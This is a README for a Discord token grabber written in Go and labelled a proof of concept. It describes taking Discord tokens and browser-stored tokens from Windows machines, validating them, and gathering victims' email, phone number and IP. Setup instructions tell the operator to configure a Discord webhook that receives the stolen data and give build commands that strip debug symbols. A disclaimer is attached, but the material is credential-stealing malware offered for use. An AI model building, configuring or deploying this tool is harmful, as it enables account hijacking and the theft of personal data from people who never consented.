# POC - Discord Grabber in Golang

*Encrypting the Discord token on Windows using WinApi specific functions and AES GCM is not necessarily useless, as it does provide some level of
 protection against unauthorized access to the token. However, it is important to note that this approach is not foolproof and there is 
always a risk of the token being compromised.* 

*Therefore, while encrypting the token is a step in the right direction, it is important for Discord to continue to evaluate and improve their security measures to better protect user data. This may involve finding alternative methods of protecting the token.*

The code on this current branch is designed for Windows Systems. If you wish to use it for Linux & MacOS, please checkout the [Unix](https://github.com/faceslog/discord-grabber-go/tree/unix) branch

### Liability Disclaimer !

The use of this software on any device that is not your own is highly discouraged.
You need to obtain explicit permission from the owner if you intend to use this program in an environment you don't own,
any illicit installation will likely be prosecuted by the jurisdiction the (ab)use occurs in.
Creators shall not be liable for any indirect, incidental, special, consequential or punitive damages, or any loss of profits
or revenue, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses,
resulting from:
- (i) your access to this resource and/or inability to access this resource
- (ii) any conduct or content of any third party referenced by this resource, including without limitation, any defamatory, offensive or illegal conduct or other users or third parties
- (iii) any content obtained from this resource


### Features:

- Send Informations via discord webhook
- Checks for Discord (Canary, PTB) tokens, Google Chrome, Brave Browser, Yandex Browser and Opera Browser
- Checks whether the token(s) is valid before sending it to avoid disabled tokens
- Check whether or not discord account has nitro
- Get Also: Email, Phone, Account display name, CPU Arch, OS, IP

### Usage:

Create a Discord Webhook (https://support.discord.com/hc/articles/228383668-Intro-to-Webhooks) <br/>
Install Golang: https://golang.org/dl

Simply change these values in the `main.go` file:
```go
const (
	WebhookUrl       = "YOUR_WEBHOOK_URL"
	WebhookUsername  = "YOUR_WEBHOOK_NAME" // Webhook name
	Debug = false // For a console output
)
```

Then simply compile the `main.go win.go` files !
```sh
# This command will keep debug info in your exe
go build main.go win.go
# By default, go build combines symbol and debug info with binary files. 
# However, you can remove the symbol and debug info with 
go build -ldflags "-s -w" main.go win.go
```
I won't provide help on how to bypass AVs as it's not the purpose of this project.

